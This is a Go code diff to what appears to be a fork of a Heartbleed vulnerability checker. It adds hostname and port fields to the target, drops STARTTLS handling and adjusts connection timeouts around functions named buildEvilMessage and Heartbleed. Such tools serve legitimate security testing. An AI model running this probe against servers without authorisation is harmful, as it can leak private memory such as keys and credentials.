@@ -7,18 +7,21 @@ import (
 	"encoding/binary"
 	"encoding/hex"
 	"errors"
+	"fmt"
 	"io"
 	"net"
 	"strings"
 	"syscall"
 	"time"
 
-	"github.com/FiloSottile/Heartbleed/heartbleed/tls"
+	"github.com/chrisDeFouRire/Heartbleed/heartbleed/tls"
 )
 
 type Target struct {
-	HostIp  string
-	Service string
+	Hostname string
+	HostIp   string
+	Port     int32
+	Service  string
 }
 
 var Safe = errors.New("heartbleed: no response or payload not found")
@@ -60,25 +63,15 @@ func buildEvilMessage(payload []byte, host string) []byte {
 
 func Heartbleed(tgt *Target, payload []byte, skipVerify bool) (string, error) {
 	host := tgt.HostIp
-	if strings.Index(host, ":") == -1 {
-		host = host + ":443"
-	}
+	host = fmt.Sprintf("%s:%d", host, tgt.Port)
 
-	net_conn, err := net.DialTimeout("tcp", host, 3*time.Second)
+	net_conn, err := net.DialTimeout("tcp", host, time.Duration(3)*time.Second)
 	if err != nil {
 		return "", err
 	}
-	net_conn.SetDeadline(time.Now().Add(10 * time.Second))
+	net_conn.SetDeadline(time.Now().Add(time.Duration(10) * time.Second))
 
-	if tgt.Service != "https" {
-		err = DoStartTLS(net_conn, tgt.Service)
-		if err != nil {
-			return "", err
-		}
-	}
-
-	hname := strings.Split(host, ":")
-	conn := tls.Client(net_conn, &tls.Config{InsecureSkipVerify: skipVerify, ServerName: hname[0]})
+	conn := tls.Client(net_conn, &tls.Config{InsecureSkipVerify: skipVerify, ServerName: tgt.Hostname})
 	defer conn.Close()
 
 	err = conn.Handshake()
@@ -142,7 +135,7 @@ func Heartbleed(tgt *Target, payload []byte, skipVerify bool) (string, error) {
 	case r := <-res:
 		return "", r
 
-	case <-time.After(8 * time.Second):
+	case <-time.After(time.Duration(8) * time.Second):
 		return "", Timeout
 	}
 
